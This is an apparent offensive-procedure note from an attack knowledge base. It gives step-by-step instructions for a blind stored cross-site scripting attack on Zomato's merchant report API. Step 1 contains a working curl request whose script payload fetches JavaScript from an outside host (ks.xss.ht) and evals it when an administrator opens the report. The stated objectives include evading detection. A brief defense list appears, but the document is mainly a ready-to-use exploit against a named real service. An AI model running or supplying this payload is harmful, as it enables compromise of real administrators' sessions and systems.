---
tags:
  - xss
  - injection
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/post-review-report-xss]]'
verified: false
platforms:
  - Web
  - Mobile App
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:30:07.335Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: a783340a-4e9a-4cca-a292-2cae81f86699
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Send-Report-Request-with-XSS-Payload

## Summary

This procedure submits a review report via POST to the Zomato API, embedding the XSS payload in the additional_text parameter to store it for later execution on the admin panel.

## Description

The Zomato Business app's /v2/merchant endpoint accepts reports with reason_id, review_id, and additional_text. Without sanitization, the text is stored and rendered as HTML on the admin side. This blind injection relies on admins viewing the report at /reviews_new?review_id={ID}. Prerequisites: Valid X-Access-Token and a target review_id. Expected outcome: Successful report storage, with payload persisting for admin exposure.

## Requirements

1. Valid X-Access-Token from Zomato authentication
2. Target review_id (e.g., 32288944)
3. Burp Suite for request interception/modification

## Defense

Defensive measures and detection strategies:

- Sanitize all additional_text inputs (strip scripts, encode HTML)
- Rate-limit report submissions per user
- Scan reports for XSS patterns before storage
- Use WAF rules to block script tags in POST bodies

## Objectives

1. Inject XSS payload into stored report data
2. Ensure blind storage without immediate detection
3. Trigger admin-side execution upon viewing

## Instructions

### Step 1: Intercept and Modify Request in Burp

**Context**: Use Burp Suite to capture the report request from the app or simulate it.

**Command** ([[commands/post-review-report-xss]]):
```bash
# Via Burp Repeater or curl simulation
curl -X POST 'https://www.zomato.com/api/v2/merchant' \
  -H 'X-Access-Token: YOUR_VALID_TOKEN' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'reason_id=5&review_id=32288944&additional_text=<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>'
```

> This sends the POST with payload. Expected output: JSON response like {"success": true} or HTTP 200.

### Step 2: Verify Submission

**Context**: Check for errors in the response.

**Command** ([[commands/post-review-report-xss]]):
```bash
# Review response in Burp or curl verbose
curl -v -X POST ... (as above)
```

> Look for success indicators in verbose output. Expected output: No 4xx/5xx errors; payload accepted.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/post-review-report-xss]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- xss
- injection
